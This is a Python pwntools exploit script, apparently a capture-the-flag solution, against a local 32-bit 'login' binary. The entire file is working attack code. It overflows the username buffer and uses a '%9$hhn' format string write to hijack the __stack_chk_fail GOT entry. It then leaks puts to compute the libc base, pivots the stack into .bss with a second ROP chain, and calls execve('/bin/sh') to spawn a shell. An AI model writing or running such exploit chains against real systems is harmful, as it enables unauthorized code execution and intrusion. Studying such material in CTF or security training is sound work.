from pwn import *
context.log_level = 'debug'
libc = ELF('./libc.so')
    
def gen_rop_data(func_addr, args, pie_text_base = 0):
     p_ret = [0x0804844e, 0x08048465, 0x0804891a, 0x08048919, 0x08048918]
     rop_data  = ''
     rop_data += p32(func_addr)
     if len(args) > 0:
         rop_data += p32(p_ret[len(args)] + pie_text_base)
     for arg in args:
         rop_data += p32(arg)
     return rop_data
    
def pwn(io):
    
    puts_got = 0x0804a01c                       
    puts_plt = 0x080484c0
    read_plt = 0x08048480
    read_buff_addr = 0x0804862B
    check_stack_fail_got = 0x804A014
    bss_addr = 0x0804a000 + 0xe20
    leave_ret = 0x08048715
    pop_ebp_ret = 0x0804871f #: pop ebp ; ret
    
    username = ""
    username += p32(check_stack_fail_got)
    username += "a"*0x4C
    username += gen_rop_data(puts_plt, [puts_got])
    username += gen_rop_data(read_buff_addr, [bss_addr, 0x01010101])
    username += p32(pop_ebp_ret) + p32(bss_addr)
    username += p32(leave_ret)
    
    print hex(len(username)), hex(0xd6 - 0x5c - 4)

    username = username.ljust(0xc0, 'a')
    username += 'a'*(0x66-0x43)
    username += "%9$hhn.".ljust(10, '-')

    
    username = username.ljust(0x100-1, 'a')
    
    password = ""
    password += 'w' * 0x40
    
    io.recvuntil(":")
    io.sendline(username)
    io.recvuntil(":")
    
    io.sendline(password)
    
    io.recvuntil("Login successful!\n")
    
    io.recvuntil("\n")
    data = io.recvuntil("\n")
    print data
    puts_addr = u32(data[:4])
    
    offset_execve = libc.symbols['execve']
    offset_puts = libc.symbols['puts']
    

    libc_base = puts_addr - offset_puts
    execve_addr = libc_base + offset_execve
    
    payload = ""
    payload += p32(0x0)
    payload += gen_rop_data(execve_addr, [bss_addr+0x100, 0, 0])
    payload = payload.ljust(0x100, 'a')
    payload += "/bin/sh\x00"
    payload += chr(0x1f)
    
    io.sendline(payload)
    io.interactive()
    
    
io = process("./login")
pwn(io)